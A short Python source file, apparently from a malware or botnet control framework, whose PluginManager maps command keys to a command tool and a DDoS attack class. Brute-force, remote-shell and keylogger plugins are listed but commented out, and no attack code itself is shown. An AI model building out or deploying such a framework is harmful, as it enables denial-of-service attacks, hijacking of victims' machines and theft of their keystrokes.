#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app.models import *


class PluginManager:
    def __init__(self):
        self.plugins = {
            'cmd': tools.Command,
            'dos': attacks.DDosAttack  #,
            #'brt': attacks.BruteForceAttack,
            #'rsh': tools.RemoteShellSession,
            #'klg': tools.Keylogger
        }
